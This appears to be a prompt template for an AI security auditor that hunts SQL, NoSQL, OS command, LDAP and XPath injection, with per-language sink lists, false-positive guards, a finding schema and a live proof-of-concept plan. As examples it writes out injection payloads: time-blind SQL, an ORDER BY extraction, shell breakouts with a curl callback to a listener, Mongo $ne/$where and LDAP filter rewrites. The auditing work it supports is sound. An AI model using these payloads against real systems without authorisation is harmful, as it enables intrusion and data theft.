<!--
FINDER PROMPT — injection. You are a fresh-context auditor hunting ONE class:
Injection (SQL / NoSQL / OS command / LDAP / XPath / ORM raw fragments). Read
the target's code; emit finding objects. Signal discipline (AGENTS.md) is
binding: only a REACHABLE untrusted-input → interpreter sink, where the input
crosses out of the data plane into the command/query structure AND no effective
parameterization/escaping/allowlist sits on the path, is a finding. No
defense-in-depth musings, no dead code, no posture items.
-->

# Finder — Injection (SQL/NoSQL/OS/LDAP) (`injection`)

**Class key:** `injection` · **OWASP:** A05:2025 · **CWE:** CWE-89 (SQL) /
CWE-78 (OS) / CWE-943 (NoSQL/query-language) / CWE-90 (LDAP) / CWE-74 (generic) ·
**ASVS:** V1/V2

## 1. Objective

Find places where untrusted input is concatenated/interpolated into a string
that an interpreter parses as **structure** — a SQL/NoSQL query, an OS shell
command, an LDAP/XPath filter — instead of being passed as an inert bound
parameter. The bug is the attacker escaping the data plane into the command
plane; the fix is almost always parameterization or a structural builder.

## 2. Where to look

Entry points where a request value reaches a query/command builder or
interpreter:

- **Data-access layers:** repositories, DAOs, `*_repository`, `models/`,
  `db/`, query objects, "search"/"filter"/"report" endpoints that build WHERE
  clauses, `ORDER BY`/`LIMIT`/column names from params (these can't be bound —
  high-risk), admin SQL/console features, CSV/report exporters, GraphQL
  resolvers translating filters to SQL, dynamic `IN (...)` list builders.
- **OS command surfaces:** image/video/PDF processing (ffmpeg, imagemagick,
  ghostscript, libreoffice), archive/zip handling, git/scm wrappers, DNS/whois/
  ping/traceroute "network tools", backup/restore, shell-out to CLI utilities,
  templating that pipes to a renderer, `Makefile`/script runners, cron/job
  payloads that exec.
- **NoSQL surfaces:** Mongo/Mongoose/Couch/DynamoDB/Elasticsearch query
  builders that accept request JSON directly as the filter object, `$where`/
  JS-eval queries, Redis `EVAL`, aggregation pipelines built from input.
- **Directory / XML surfaces:** LDAP auth & user-search (bind/search filters),
  SAML/SCIM lookups, XPath over XML configs/SOAP, `XPathExpression` built from
  input.
- **ORM escape hatches:** raw-SQL methods, `.where("...#{x}...")` string forms,
  `find_by_sql`, `Sequel.lit`, `db.Raw`, `queryRaw`, `entityManager
  .createQuery` with string concat, Hibernate HQL concat, `.extra()`/`.raw()`.

Route/handler param signals to grep: `q`, `query`, `search`, `filter`, `sort`,
`order`, `order_by`, `column`, `field`, `table`, `name`, `id`, `email`, `host`,
`cmd`, `file`, `path`, `format`, `dn`, `uid`, `username` — anywhere these land
in a string later handed to a DB driver, a shell, or an LDAP/XPath API.

Per-language SINK signals:

- **Crystal:** `db.query("...#{x}...")`, `db.exec`, `db.scalar` with
  interpolation (the `?`/`$1` arg form is safe); `Process.run(cmd, shell: true)`,
  `` `#{x}` `` backticks, `system`.
- **Ruby:** `ActiveRecord` `where("name = '#{x}'")`, `find_by_sql("..#{x}")`,
  `exec_query`, `connection.execute`, `order(params[:sort])`,
  `Sequel.lit`/`db["..#{x}"]`; `` `#{x}` ``, `system("..#{x}")`,
  `%x{#{x}}`, `Open3.capture2("sh","-c", "..#{x}")`, `Kernel.exec`;
  Mongo `collection.find(params)`; `Net::LDAP::Filter.construct("..#{x}")`.
- **Node/TS:** `db.query("SELECT ... " + x)`, template-literal SQL
  `` db.query(`... ${x}`) `` (pg/mysql2), Sequelize `sequelize.query(\`..${x}\`)`
  / `literal()`, Knex `.whereRaw(\`..${x}\`)`, Prisma `$queryRawUnsafe(x)` /
  `$executeRawUnsafe`, TypeORM `createQueryBuilder().where("x = " + v)`;
  `child_process.exec(\`..${x}\`)`, `execSync`, `spawn(cmd, {shell:true})`;
  Mongo `Model.find(req.query)` / `$where: req.body.js`; `ldapjs` search filter
  built by concat.
- **Python:** `cursor.execute("... %s" % x)` / `.execute(f"...{x}")` /
  `"..."+x` (the `(sql, params)` 2-arg form is the safe one), SQLAlchemy
  `text("..."+x)` / `.from_statement`, Django `.raw("..%s"%x)` / `.extra()` /
  `RawSQL`; `os.system`, `subprocess.run(cmd, shell=True)`,
  `subprocess.Popen(..., shell=True)`, `os.popen`, `commands.getoutput`;
  `pymongo` `coll.find(request.json)` / `$where`; `ldap3` filter concat,
  `lxml`/`etree` `xpath("..."+x)`.
- **Go:** `db.Query(fmt.Sprintf("...%s", x))` / `db.Exec("..."+x)` (the
  `(query, args...)` placeholder form is safe), `gorm` `.Raw(...+x)` /
  `.Where("col = "+x)`, `sqlx` `.Queryx` with concat; `exec.Command("sh","-c",
  "..."+x)`, `exec.Command("bash","-lc", x)`; Mongo `bson.M` built from request
  with operator-bearing keys.
- **PHP:** `mysqli_query($c, "...$x")`, `$pdo->query("...".$x)` (vs prepared
  `$pdo->prepare(...).execute([...])`), `$wpdb->query("...$x")` (vs
  `$wpdb->prepare`), Laravel `DB::raw`/`whereRaw("..$x")` /
  `DB::select("..$x")`; `exec`, `shell_exec`, `system`, `passthru`, `popen`,
  `` `$x` ``, `proc_open`; `ldap_search($c, $base, "(uid=$x)")`.
- **Java:** `Statement.executeQuery("..."+x)` / `createStatement().execute`
  (vs `PreparedStatement` `?`), `jdbcTemplate.queryForObject("..."+x)`,
  Hibernate `createQuery("from U where name='"+x+"'")` / `createNativeQuery`;
  `Runtime.getRuntime().exec(...+x)`, `ProcessBuilder("sh","-c", x)`;
  `ctx.search(base, "(uid="+x+")", ...)` (JNDI/LDAP),
  `xpath.compile("//user[@id='"+x+"']")`.
- **Rust:** `sqlx::query(&format!("...{}", x))` (vs `sqlx::query!`/`.bind`),
  `diesel::sql_query(format!(..))`, `rusqlite` `conn.execute(&format!(..))`
  (vs params), `tokio_postgres` format-string query;
  `Command::new("sh").arg("-c").arg(x)`, `std::process::Command` with a
  shell wrapper.

## 3. Detection heuristics

**Taint SOURCES** (untrusted): HTTP query/body/path/header/cookie values, JSON
fields, multipart fields & filenames, GraphQL args, message-queue/webhook
payloads, file contents being parsed, **and DB rows that were originally
user-set** (second-order/stored injection — value written safely, later
concatenated into a new query). For NoSQL specifically, an entire request object
(`req.query`, `request.json`) passed as a filter is itself a source because its
*keys* may be operators (`$gt`, `$ne`, `$where`, `$regex`).

**Taint SINKS** (dangerous op): the language-specific calls in §2 where the
tainted value is placed in the **structural** part of the string/object —
i.e. concatenated/interpolated/format-substituted into SQL/HQL/command/filter
text, OR supplied as a NoSQL filter whose operator keys are attacker-controlled,
OR used as a SQL identifier (table/column/`ORDER BY`/direction) that cannot be
bound.

Vulnerable patterns to confirm:

- **String-built SQL:** any concatenation/interpolation/`Sprintf`/`%`/f-string/
  template-literal producing query text from a source. The tell is that the
  driver's placeholder API (`?`, `$1`, `:name`, `%s`+params tuple) is *not* used
  for that value.
- **Identifier injection (un-bindable):** `ORDER BY #{params[:sort]}`,
  `SELECT #{col}`, dynamic table name. Placeholders bind *values*, never
  identifiers — so this needs an allowlist, and concat here is exploitable even
  when value params elsewhere are bound. Common false-safe assumption.
- **OS command via shell:** input reaching a sink that spawns through a shell
  (`shell:true`, `sh -c`, backticks, `os.system`, `exec(string)` where the
  string is parsed by `/bin/sh`). Metacharacters `; | & $() \`\` > <` break out.
  Even argv-style is unsafe if the binary itself splits/globs the arg or the
  arg starts with `-` (argument injection, e.g. `--upload-file`, `-o`).
- **NoSQL operator injection:** `Model.find(req.query)` where a client sends
  `{"password":{"$ne":null}}` or `username[$regex]=^admin`; `$where`/`$function`
  with a string from input (server-side JS eval); Mongo aggregation `$expr`
  built from input.
- **LDAP filter injection:** `(&(uid=#{user})(...))` with `user="*)(uid=*"` →
  auth bypass / filter rewrite; DN built by concat enabling base/scope change.
- **XPath injection:** `//user[name/text()='`+x+`']` with `x="' or '1'='1"`.
- **ORM raw fragments:** the `*Unsafe`/`raw`/`lit`/`sql_query`/`whereRaw`/`.extra`
  family fed a concatenated string. The safe sibling (`query!`, `$queryRaw`
  tagged template, parameterized `whereRaw('?', [x])`) usually exists right
  beside it — confirm which one is used.
- **Second-order:** value stored via a parameterized write, then read back and
  concatenated into a later query/command. Trace the read site, not just writes.

## 4. Not-a-finding (false-positive guard) — check BEFORE flagging

Do NOT report if any of these is present AND effective on the path:

- **Parameterized / prepared query:** the value rides in the driver's bind slot,
  not the SQL text — `?`/`$1`/`:name` with a separate args array/tuple, JDBC
  `PreparedStatement.setX`, `cursor.execute(sql, params)` 2-arg form, pg/mysql2
  `query(text, values)`, Prisma `$queryRaw\`...${x}\`` *tagged template*
  (auto-parameterized — distinct from `$queryRawUnsafe`), sqlx `query!`/`.bind`,
  Go `db.Query(q, args...)`, Sequel/AR placeholder hashes & array conditions
  (`where("a = ?", x)`, `where(name: x)`). This is the gold standard — if the
  tainted value is bound, it is NOT a finding regardless of surrounding concat.
- **ORM builder with structured args:** `where(hash)`, query-builder methods
  passing values as params, ActiveRecord/Sequel/Ecto/Django ORM expressions that
  emit binds. Only the *raw* escape hatches are suspect.
- **Argv exec without a shell:** `subprocess.run([bin, arg], shell=False)`,
  `execFile`/`spawn(bin, [args])` with `shell:false`/default, Go
  `exec.Command(bin, arg1, arg2)` (no `sh -c`), Ruby `system(bin, arg1)` array
  form, `ProcessBuilder` with separate args — metacharacters are inert. (Still
  flag if argument injection applies: arg is attacker-controlled, begins with
  `-`, and the program treats leading-dash args as options.)
- **Identifier allowlist:** dynamic table/column/`ORDER BY`/direction mapped
  through a fixed whitelist or enum (`{"name"=>"name","date"=>"created_at"}`,
  `sort in ALLOWED`), so the raw string never reaches the query — safe.
- **NoSQL with typed/cast input:** input coerced to a scalar (`String(x)`,
  schema-validated to a primitive, Mongoose `runValidators` + strict schema, or
  explicit `{$eq: x}`) before use, or query keys are server-defined constants
  and only values come from input — operator injection closed. `sanitize`/
  `mongo-sanitize`/`express-mongo-sanitize` stripping `$`/`.` keys counts if
  applied on the path.
- **LDAP/XPath escaping:** values passed through a real escaper —
  `Net::LDAP::Filter.escape`, `ldap3`/`ldapjs` filter *builders* (not concat),
  Java `Filter`/`encodeForLDAP` (ESAPI), XPath variable binding
  (`XPathVariableResolver`/`setVariable`) instead of string concat — safe.
- **Value provably not attacker-influenced:** a hardcoded constant, an
  operator/config-set value, an internal enum, or a numeric value already
  cast/validated to an integer (`Integer(x)` that raises, `parseInt` + range
  check, typed route param `:id(\\d+)`) such that no SQL metacharacter survives.
  A cast to int that *silently* coerces or a regex that still allows quotes is
  NOT a mitigation.
- **DB-side allowlist / least-priv that nullifies impact** is NOT a parser-level
  fix — do not credit it as a sanitizer; at most it lowers severity. Note it,
  but the injection is still a finding.

If a guard exists but is bypassable (escaping the wrong context, a denylist of
metacharacters rather than parameterization, `replace("'","''")` that misses
backslash/`--`/Unicode, casting that silently truncates, mongo-sanitize applied
to the wrong object), it is NOT a mitigation — flag it and name the bypass in
`sanitizers_checked`.

## 5. Severity guidance

- **Critical** — unauthenticated, reachable injection into a primary datastore
  with high impact: full SQL/NoSQL query control (data exfil/auth bypass/write),
  OS command execution (RCE), `$where`/`EVAL` server-side code exec, or LDAP
  bind-filter injection yielding auth bypass. Attacker controls query/command
  structure with no effective sanitizer.
- **High** — authenticated or realistically-conditioned injection with
  significant impact: read/modify other tenants' data, blind boolean/time-based
  SQLi, identifier/`ORDER BY` injection that still leaks data via error/timing,
  OS command behind an authn wall, second-order injection with broad reach.
- **Medium** — constrained injection: limited to a small surface (single column,
  numeric-ish field with partial filtering), blind with a weak oracle, or a
  partial mitigation that narrows but doesn't close exploitation; LDAP/XPath
  injection with limited disclosure.
- **Low/Info** — injection into a non-security-relevant local interpreter with
  no cross-trust impact, or a theoretical concat where the value is effectively
  constrained to a safe charset — usually downgrade or drop per §4.

Second-order/stored injection keeps the severity of its eventual sink; note the
persistence and the write→read path in `rationale`.

## 6. Emit findings as

One JSON object per distinct root cause (dedup call sites; list extras in
`rationale`). Fields:

```json
{
  "id": "injection-001",
  "title": "Unauthenticated SQLi via sort param interpolated into ORDER BY",
  "vuln_class": "injection",
  "owasp": "A05:2025",
  "cwe": "CWE-89",
  "asvs": "V1",
  "severity": "high",
  "status": "likely",
  "confidence": "high",
  "file": "app/repositories/user_repository.rb",
  "line": 33,
  "end_line": 35,
  "code_excerpt": "User.order(\"#{params[:sort]} #{params[:dir]}\").limit(50)",
  "source": "params[:sort], params[:dir] — GET /users query string, route has no auth filter",
  "sink": "ActiveRecord .order(\"...\") — raw string spliced into the SQL ORDER BY clause (identifiers cannot be bound)",
  "data_flow": "params[:sort]/params[:dir] -> string interpolation -> .order(raw) -> generated SQL; values reach the query structure, not a bind slot; no allowlist between source and sink",
  "sanitizers_checked": "no identifier allowlist/enum mapping for sort or dir; not parameterized (ORDER BY identifiers are not bindable so binds wouldn't help); no cast; AR does not escape .order() string args",
  "rationale": "Reachable from unauth route; sort=\"(CASE WHEN (SELECT ...) THEN name ELSE id END)\" enables boolean/time-based blind extraction of arbitrary columns. Same pattern at report_repository.rb:71 (group_by).",
  "exploit_sketch": "GET /users?sort=(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN name ELSE id END)&dir=asc -> row ordering changes oracle-style, leaking the hash char by char.",
  "dynamic_poc_plan": "Send a sort payload with a SLEEP/pg_sleep CASE subquery; observe response-time delta vs a benign sort to confirm the subquery executes inside the live DB query.",
  "proposed_fix": "Identifiers can't be bound, so the sort/dir inputs must be constrained to a known-good set of columns and directions rather than reaching the SQL structure as raw strings; this closes the data-plane escape while leaving the exact mechanism to the implementer."
}
```

Accuracy bar: `source`, `sink`, `data_flow`, and `sanitizers_checked` must be
concrete and true. `data_flow` traces variables source→sink and states why the
value lands in the command plane (concat/interpolation/identifier) rather than a
bind slot, naming any guard encountered and why it fails. `sanitizers_checked`
is the FP guard made explicit — list each §4 control and state it is absent or,
if present, name the exact bypass (e.g. "quote-doubling only, backslash escapes
the closing quote"). A finding without an untrusted source reaching a real
interpreter sink in the structural position is not a finding. Pick `cwe` by
interpreter: 89 SQL, 78 OS, 943 NoSQL/query, 90 LDAP, 74 generic/other. Use
`status:"likely"` for a proven static trace, `"confirmed"` only after dynamic
repro, `"triage"` if reachability/source is uncertain.

## 7. Dynamic PoC strategy

Goal: prove the running interpreter parses attacker input as structure, not
data. Pick the oracle matching the sink:

1. **SQL — error/boolean/time oracle.** Against the live endpoint, send a
   payload that changes the *query's truth or shape*:
   - **Error:** inject an unbalanced quote (`'`) or type-clash; **observed proof**
     = a DB syntax error surfaced/logged (500 with SQL fragment, driver error)
     that a bound parameter could never produce.
   - **Boolean:** compare `?id=1 AND 1=1` vs `?id=1 AND 1=2` — **observed proof**
     = the two requests return different result sets (one row vs none).
   - **Time-blind:** inject `;SELECT pg_sleep(5)`/`SLEEP(5)`/`WAITFOR DELAY`;
     **observed proof** = response latency tracks the requested delay (5s vs
     control), proving the subquery ran in the DB.
2. **OS command — out-of-band or marker.** Inject a benign side-effect:
   `; sleep 5`, `$(sleep 5)`, `| id`, or `; curl http://<listener>/<nonce>`.
   **Observed proof** = the listener records the nonce hit from the server host,
   OR the response/timing reflects the injected command (latency delta, `id`/
   `uname` output echoed). Prefer the OOB callback for blind cases.
3. **NoSQL — operator oracle.** Send `username[$ne]=x` / JSON
   `{"$gt":""}` / `{"$where":"sleep(5000)||true"}`; **observed proof** = an
   auth/login that should fail now succeeds (returns a session/record), or the
   `$where` sleep induces a measurable delay — both impossible if the value were
   treated as a scalar.
4. **LDAP / XPath — filter-rewrite oracle.** Send `*)(uid=*` (LDAP) or
   `' or '1'='1` (XPath); **observed proof** = a lookup that should match one or
   zero entries now returns all/expanded results, or a login succeeds without
   valid credentials.

Run the relevant bypass checks when a partial guard exists: quote-escaping
evasion (backslash, double-encoding, Unicode quote), comment terminators
(`--`, `#`, `/* */`), stacked queries if the driver allows, argv argument
injection (leading `-`/`--option`), and mongo-sanitize bypass (nested/`.`-keyed
operators). Record the exact request and observed evidence in the `Repro`
object (`reproduced`, `method:"live-exploit"`, `poc`, `observed`, `impact`).
A time/OOB confirmation alone proves injection — set `method:"live-exploit"`
and note blindness in `notes`. If the app can't be run, fall back to a focused
unit test that drives the sink with the payload (`method:"unit-test"`).
